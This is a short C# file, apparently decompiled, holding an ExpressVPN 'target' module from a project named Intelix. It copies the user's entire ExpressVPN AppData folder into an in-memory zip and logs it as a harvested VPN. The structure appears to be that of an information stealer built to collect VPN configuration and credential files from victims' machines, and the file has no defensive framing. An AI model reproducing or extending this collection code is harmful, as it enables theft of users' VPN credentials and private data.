using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000009 RID: 9
	public class ExpressVPN : ITarget
	{
		// Token: 0x06000024 RID: 36 RVA: 0x00002984 File Offset: 0x00000B84
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ExpressVPN");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "ExpressVPN";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "ExpressVPN";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
